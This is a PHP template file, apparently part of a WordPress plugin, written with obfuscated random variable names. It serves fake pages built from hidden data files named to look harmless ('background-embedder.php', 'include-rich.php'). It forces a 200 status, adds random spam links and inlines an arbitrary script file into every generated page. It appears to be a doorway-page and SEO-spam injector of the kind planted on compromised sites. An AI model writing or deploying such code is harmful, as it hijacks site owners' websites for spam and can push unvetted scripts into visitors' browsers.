<?php
$xbFCd = intval(get_query_var('jpnyy'));

if ($xbFCd < 1 || $xbFCd > 5997) return;
$vD8mC1 = file(plugin_dir_path(__FILE__).'background-embedder.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$e9JfgX = explode(';', $vD8mC1[$xbFCd]);
if (count($e9JfgX) < 2) return;
$w6Ym2Qw4 = $e9JfgX[0];
$xhIrpO  = $e9JfgX[1];
$iyfrWuYd = $e9JfgX[2];
$gFIPzGkO  = $e9JfgX[3];
$hILUEP = $e9JfgX[4];
set_query_var('onbfic', $w6Ym2Qw4);

$hhQ8co6bB = '';
$tJqeq = plugin_dir_path(__FILE__).'include-rich.php';
if (is_file($tJqeq)) {
	$yCEvh6ue = file($tJqeq, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($yCEvh6ue);
	shuffle($yCEvh6ue);
	$mGUtTq703K = mt_rand(2, 5);
	if (count($yCEvh6ue) > $mGUtTq703K) {
		for ($rnjfN = 0; $rnjfN < $mGUtTq703K; $rnjfN++) {
			$aO0HvtH6n = array_shift($yCEvh6ue);
			$hhQ8co6bB .= '<p><a href="'.$aO0HvtH6n.'">'.$aO0HvtH6n.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $w6Ym2Qw4; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $xhIrpO . "</p>\n";
				if (strlen($gFIPzGkO) > 0) echo "<p>" . $gFIPzGkO . "</p>\n";
				if (strlen($iyfrWuYd) > 0) echo "<p>" . $iyfrWuYd . "</p>\n";
				if (strlen($hILUEP) > 0) echo '<p><a href="#"><img src="'.$hILUEP.'"></a>' . "</p>\n";
				echo $hhQ8co6bB;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$qVCG88y7 = plugin_dir_path(__FILE__) . 'snippets-poster.js';
if (is_file($qVCG88y7)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($qVCG88y7);
	echo '</script>';
}
get_footer();
?>
